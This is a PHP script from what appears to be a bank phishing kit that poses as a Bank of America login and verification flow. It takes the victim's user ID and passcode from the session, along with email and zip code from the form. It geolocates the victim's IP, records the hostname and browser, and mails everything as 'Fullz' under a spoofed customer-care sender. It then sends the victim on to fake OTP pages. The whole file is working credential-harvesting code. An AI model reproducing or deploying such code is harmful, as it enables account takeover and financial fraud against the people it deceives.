<?php
session_start();
ob_start();

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
	      $region=$data['geoplugin_regionName'];
		  $country=$data['geoplugin_countryName'];
		  $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];

//Filling Email to send
include('grabber.php');


//Getting UserID info from Session
$us = $_SESSION['UserID'];
$ps =  $_SESSION['PassCode'];
$_SESSION['email'] = $email = $_POST['emailaccess'];
$_SESSION['zip'] = $zip = $_POST['zip'];
$wizard = $_POST['wiz'];


include 'verify_email.php';	
if($flag==1 || $flag1==1){
	
		$moveappend = "OTPdeliveryMode.aspx";
		$movemessage = 'Invalid_Input';
		$movelocation="simpverify.php?$moveappend&LOB=$movemessage&$email";
		header("Location: $movelocation");
	
	}else{



$Chase="==================+[B0@ Billy Info  ]+==================
UserID : $us
Password   : $ps
Email: $email
Zip: $zip
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Country: $country
Region: $region
Time: $log_date
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";


$subject = "$us | BOOOOOOA Fullz";
$headers = "From: Alerts <customercare@privejets.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$Chase,$headers);




$asp = "OTPVerification.aspx";
$Redirect="silent-ajax.php?$asp&ref=SSO";
header("Location: $Redirect");

	}

?>
